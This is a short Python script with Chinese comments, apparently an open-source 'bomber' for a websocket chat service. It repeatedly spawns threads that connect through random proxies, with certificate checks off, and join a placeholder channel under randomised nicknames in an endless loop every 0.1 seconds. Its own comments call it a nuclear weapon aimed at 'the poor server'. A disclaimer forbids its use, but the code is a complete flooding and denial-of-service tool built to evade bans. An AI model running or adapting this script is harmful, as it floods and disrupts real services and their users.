'''
    声明：
    本轰炸机仅供参考，严禁使用本程序进行轰炸！！！
'''
import json
import time
import websocket
import random
import ssl
import threading
import get_proxy
channel="一个频道"    #可怜的频道
main_nick="ZhangKillerPlus_开源版 "  #核武器的名称
wsaddr="目标服务器"    #可怜的服务器
def boom():    #一个核武器
    try:
        nick=main_nick+str(random.randint(1,999))
        proxy=get_proxy.get_random_proxy()
        ws=websocket.create_connection(wsaddr,sslopt={"cert_reqs": ssl.CERT_NONE},http_proxy_host=proxy["addr"][0], 
                http_proxy_port=proxy["addr"][1], 
                proxy_type=proxy["type"],
                timeout=5)
        ws.send(json.dumps({"cmd":"join","channel":channel,"nick":nick}))  #BOOM！
        ws.close()    #溜了溜了
    except:
        pass    #有的时候我们就应该啥也不干
input('请按下回车键来启动核武器...')
print('核武器现在启动！')
while True:
    try:
        threading.Thread(target=boom).start()
    except:
        pass    #有的时候我们就应该啥也不干
    time.sleep(0.1) #手下留情